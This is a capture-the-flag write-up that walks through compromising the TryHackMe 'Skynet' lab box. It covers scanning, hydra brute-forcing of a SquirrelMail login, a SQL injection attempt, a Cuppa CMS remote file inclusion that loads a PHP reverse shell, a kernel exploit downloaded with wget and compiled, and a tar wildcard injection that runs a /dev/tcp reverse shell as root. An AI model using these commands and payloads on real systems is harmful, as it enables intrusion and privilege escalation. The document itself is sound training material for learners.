[Skynet](https://tryhackme.com/room/skynet)

## Initial Recon
The first thing we'll do is run nmap on the target. I first run a Scripts and Version scan and then an all ports scan to see if anything unusual is running on unexpected ports. The results show the box is running SSH, HTTP, SMB, POP3, and IMAP. IMAP (Internet Message Access Protocol) and POP3 (Post Office Protocol) are both services related to email. 
```bash
┌──(ķ̤̜͓̩̓͑̂̅͝ali̻͙̝̫͜㉿K̺̬̜̩͆̋̕͟͠͡al̠̟̘̹̦̀̉͂̂͐ĭ͍̼̭̐̾̌͜͜͡)-[~/thm/Rooms/Skynet]
└─[🟊] sudo nmap -sC -sV $IP && sudo nmap -p- $IP

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING UIDL SASL AUTH-RESP-CODE RESP-CODES CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 SASL-IR ENABLE more LOGIN-REFERRALS OK ID Pre-login LITERAL+ have post-login listed IMAP4rev1 capabilities IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-12-03T07:38:44
|_  start_date: N/A
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-12-03T01:38:44-06:00
```
## HTTP
The IP takes me to a basic website with what seems to be a search function. However, the website does not seem to be functional. The two buttons, "Skynet Search" and "I'm Feeling Lucky" do send POST requests, but don't include what I put in the search bar.

![Main-Site](https://user-images.githubusercontent.com/112681383/205478409-8a824d6b-981b-4d70-843c-5f56704d9fc1.png)

![Burp-Skynet-Search](https://user-images.githubusercontent.com/112681383/205478391-bab8fe82-bcb8-41eb-a703-8e6d8db2f7cc.png)

I decide to run FFUF on the site to see what it turns up:
```bash![rev-shell-root](https://user-images.githubusercontent.com/112681383/205479984-d275b899-af7a-4d13-81ba-0049bfb0d8b5.png)

┌──(ķ̤̜͓̩̓͑̂̅͝ali̻͙̝̫͜㉿K̺̬̜̩͆̋̕͟͠͡al̠̟̘̹̦̀̉͂̂͐ĭ͍̼̭̐̾̌͜͜͡)-[~/thm/Rooms/Skynet]
└─[🟊] ffuf -u http://$IP/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -e .html,.php,.txt


        /'___\  /'___\           /''___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.2.177/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 156ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2141ms]
admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 3146ms]
config                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 161ms]
index.html              [Status: 200, Size: 523, Words: 26, Lines: 19, Duration: 157ms]
squirrelmail            [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 158ms]
ai                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 157ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 156ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 158ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 157ms]
:: Progress: [120000/120000] :: Job [1/1] :: 235 req/sec :: Duration: [0:08:07] :: Errors: 8 ::
```
Most of these give me a 403 Forbidden response, except /squirrelmail.

Squirrelmail takes me to a login page for an email service. Interestingly, It doesn't look like I need the full email address to log in, only a username and password. I try a couple obvious creds like `admin:admin`, `admin:password`, etc, as well as basic SQL injection: `admin' OR 1=1-- -:password`, but don't get in. It was worth a shot.

![squirrelmail](https://user-images.githubusercontent.com/112681383/205478514-b53e6a34-79a6-4b6b-a909-50f345acc239.png)

A `searchsploit` for squirrelmail 1.4 search turns up a few interesting results for Local File Inclusion and Remote Code Execution, but both of these look like I need log in creds.

![searchsploit-squirrelmail](https://user-images.githubusercontent.com/112681383/205478588-7aa3cf61-1c86-4532-9261-a3aa3b8d4362.png)

Time to move on to SMB.

## SMB
Running `smbmap` reveals that the share `anonymous` allows anonymous log in and read access. In the share are 4 files, attention.txt, log1.txt, log2.txt, and log3.txt. `Attention.txt` contains a message about a malfunction causing passwords to change, and that employees must change their passwords. It also contains a possible username: `Miles Dyson`.` Log1.txt` contains what looks like a wordlist of passwords. Log2.txt and Log3.txt are both empty 

![smbmap](https://user-images.githubusercontent.com/112681383/205478630-923ec530-2273-4ec4-9855-6e32d98a23db.png)

Using this username and password list I decide to bruteforce `squirrelmail`. The wordlist is short enough that I could manually copy and paste each password, but it's more fun to use hydra. I create a short username wordlist containing a few variations of Miles Dyson, "milesdyson, mdyson, miles, etc.". I use burp to grab the url and POST data for the login, and use the incorrect password error from the site as the fail state. After a little while, hydra returns the password and username: `milesdyson:cyborg007haloterminator`
```bash
hydra -L usernames.txt -P log1.txt -u $IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect"
<... SNIP ..>
[80][http-post-form] host: 10.10.133.117   login: m*********   password: c****************
```
In the inbox are 3 emails, 2 contain what I think are Terminator references, but one contains an SMB password. 

Now that we have creds for Squirrelmail, we could try some of those exploits we saw before. Spoiler alert: they didn't work. Perhaps if I had finagled it some more I could have got it to work. I ran the bash script, and then tried to manually do what the bash script was doing. I wasn't successful with either of these, and decided to come back to it if I hit a dead end in the future. Time to hop back into SMB with our new creds.

I can now access the "milesdyson" smb share. In it is a folder caled "notes", in that is a file called "important.txt". In that file is a line `Add features to beta CMS /45kra24zxs28v3yd`. This looks like a could be a directory that's been "hidden by obscurity."

## Directory /45kra24zxs28v3yd
It is indeed! It's Miles' personal page. Nothing interesting on this page so I decide to fuzz it. This turns up a page called "administrator"
```bash
┌──(ķ̤̜͓̩̓͑̂̅͝ali̻͙̝̫͜㉿K̺̬̜̩͆̋̕͟͠͡al̠̟̘̹̦̀̉͂̂͐ĭ͍̼̭̐̾̌͜͜͡)-[~/thm/Rooms/Skynet]
└─[🟊] ffuf -u http://$IP/45kra24zxs28v3yd -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -e .html,.php,.txt

        /'___\  /'___\           /''___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.2.177/45kra24zxs28v3yd/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

administrator           [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 157ms]
index.html              [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 158ms]
:: Progress: [120000/120000] :: Job [1/1] :: 251 req/sec :: Duration: [0:08:04] :: Errors: 8 ::
```
/Administrator is a login page for "Cuppa CMS". 

I try to log in to this with the 2 sets of creds I found. Neither work. Neither does basic SQLi. Inspecting the page source reveals a commented line of html that looks like a password reset form. I intercept the page response in burp and uncomment the line, and indeed this does load a password reset function. This prompts me an email address, I have access to Miles' email account, maybe I can reset his password? Interestingly, I can't actually find his exact email address in Squirrelmail. I take a couple guesses, but I don't manage to get an email in the inbox.

![forgot-password-burp](https://user-images.githubusercontent.com/112681383/205479022-4d7666e0-10db-4d6d-a4c9-f101654cfb25.png)
![forgot-password-form](https://user-images.githubusercontent.com/112681383/205479024-eab298a5-50c1-42c8-8510-ec2441cef916.png)

I search exploit-db for "Cuppa CMS" which brings back one lone result, for Local & Remote File Inclusion. Reading the exploit tells me that the url `http://{TARGET IP}/{CUPPA DIRECTORY}/alerts/alertConfigField.php?urlConfig=` is vulnerable to LFI/RFI. 

https://www.exploit-db.com/exploits/25971

I give it a try with `http://$IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`, and to my great joy, this just works! No authentication needed.

![LFI-works](https://user-images.githubusercontent.com/112681383/205479103-c1b3dd81-6739-4837-879d-140fe2899493.png)

I test the RFI by setting up a python server on my attack box with `python3 -m http.server 80` and using the payload `urlConfig=http://{MY IP}/` and sure enough I get a hit. Now I just need to host a reverse shell and get the site to execute it. I use the classic [php shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) from PentestMonkey, and put it in my server directory. I start up a netcat listener `nc -lvnp 9001` and use the RFI payload `urlConfig=http://{MY IP}/shell.php` and sure enough, I get a shell as www-data! Now to escalate privileges.

![Reverse-Shell-1](https://user-images.githubusercontent.com/112681383/205479257-7b4c1dee-d222-46f6-a4ed-77e2ad4fa2eb.png)

## Priv Esc
*Note: The method I first used for priv esc I don't think was the intended method. But it used a CVE from 2017, and the box came out in 2020 so to me it's fair game. I'll go over the intended priv esc after this.*

First things first, I upgrade my shell using the [python pty trick](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' # Enter a python PTY
CTRL+Z # Background my rev shell to get back on my attacking machine
stty raw -echo; fg # Enter this on attacking machine
# Press Enter twice. This will get you back onto victim box.
export SHELL=bash && export TERM=xterm && stty rows 67 columns 125
```
Looking around I see I'm not part of any special groups, and I don't have www-data's password so I don't know what I can run with sudo. I look at `/etc/passwd` to see what user's are on the box. Sure enough, there's good old Miles. I `su milesdyson` and try the 2 passwords I have for him, and the Squirrelmail one gets me on his account. I check `sudo -l` and unfortunately, he has no sudo privileges. In his home directory is a script running as root called `backup.sh` I check `/etc/crontab` and sure enough, the script runs once a minute. 

I figure this is probably the intended priv esc method but I want to look around and see if there's another way. 

Eventually I run `linpeas.sh`, and it highlights the Linux kernel version in red. I do a `searchsploit Linux Kernel 4.8.0` and one result for Privilege Escalation looks promising. Reading the exploit, it looks like it was tested on the exact kernel this box is running! `4.8.0-58-generic #63~16.04.1-Ubuntu SMP`

![linpeas](https://user-images.githubusercontent.com/112681383/205481074-4c8e2945-fec6-4f9f-a9ad-c3ee39821523.png)
![searchsploit-kernel](https://user-images.githubusercontent.com/112681383/205481084-2e27641f-2c53-4912-b62a-0c040946d877.png)

I grab the exploit from searchsploit, download it to the victim box, compile it, execute it, and just like that it gave me a root shell.
```bash
searchsploit -m linux/local/43418.c # Attacker : Download exploit
mv  43418.c pwn.c # Attacker : Rename it for ease of use
wget http://$IP/pwn.c # Victim : move exploit to victim
gcc pwn.c -o pwn # Victim : Compile the exploit
./pwn # Victim : Run exploit, become root >:)
```
Now to be fair, this kernel exploit involves memory corruption, and is currently above my paygrade, ie, I don't really understand how it works. In the exploit code itself is a link to Rick Larabee's blog where he goes more in depth on it and it's some good reading if you're up for it: https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html

## Intended Priv Esc Method
So the script running in milesdyson's home directory is simple it's just:
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
It changes directories into `/var/www/html` and creates a `.tgz` file into Miles' home directory. Now our entry point here is that asterisk, or wildcard. It will just add whatever is in the directory to the `tar` command. On GTFOBins, there's a [one liner](https://gtfobins.github.io/gtfobins/tar/#sudo) for tar that will give root access: 
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Here's how this one liner works: 
`tar -cf` tells `tar` to create an archive from one file and save it as a new file. 
The 1st `/dev/null` is the archive to be created, the 2nd `/dev/null` is the file to create an archive from. In this case `/dev/null` just points to nothing. 
`--checkpoint=1` tells tar to display progress messages for the archiving process. 
`--checkpoint-action=` tells tar what to do each time a checkpoint is reached, in this case `exec=/bin/sh`, which if `tar` is being run with root privileges, will start a `/bin/sh` shell as root.

Here's how we can adapt this to fit our scenario:
Currently the `backup.sh` script will essentially run
```bash
tar cf /home/milesdyson/backups/backup.tgz admin ai config etc...
```
Adding all the files in the `/var/www/html directory.` But what if there's files in that directory with names like `--checkpoint=1`? What we can do, is add files into the directory with names that will cause backup.sh to run
```bash
tar cf /home/milesdyson/backups/backup.tgz --checkpoint --checkpoint-action={Whatever We Want }
```
Since `tar` is being executed in the script by root, whatever we execute will be run as root. Since `tar` is running in a script, we can't just `exec=/bin/sh` like in the one liner, as that will just start a shell "for the script", rather than for us. What we can do, is create a bash script to be executed. There are many things we could do with this script: send a reverse shell, create a new user with root privileges, give our current user sudo privileges, edit /etc/passwd to give our current user root privileges, etc. I decided to go with a reverse shell. So here's what I did: First I had to start another reverse shell through the RFI vuln to get back on `www-data`'s account, since I couldn't `su` back to it, and `milesdyson` wasn't allowed to write to `/var/www/html`. Once back on www-data I used these commands:
```bash
echo 'bash -i >& /dev/tcp/$IP/9002 0>&1' > privesc.sh # Basic reverse shell script
echo "doesn't matter" > "--checkpoint-action=exec=bash privesc.sh"
echo "whatever" > --checkpoint=1
```
![rev-shell-root](https://user-images.githubusercontent.com/112681383/205479999-a6093f15-c3ab-4f83-899d-5aa443017ed4.png)

This will cause `tar` to execute `privesc.sh` as root and just like that, we have a reverse shell as root :)
If I was more interested in persistance, I would give `www-data` sudo privileges, as it's quieter than giving `www-data` root access, and it's quicker to get root access, because all I'd have to do is run the RFI reverse shell and sudo bash to become root.
That's all for now!

Hope this writeup was helpful :)
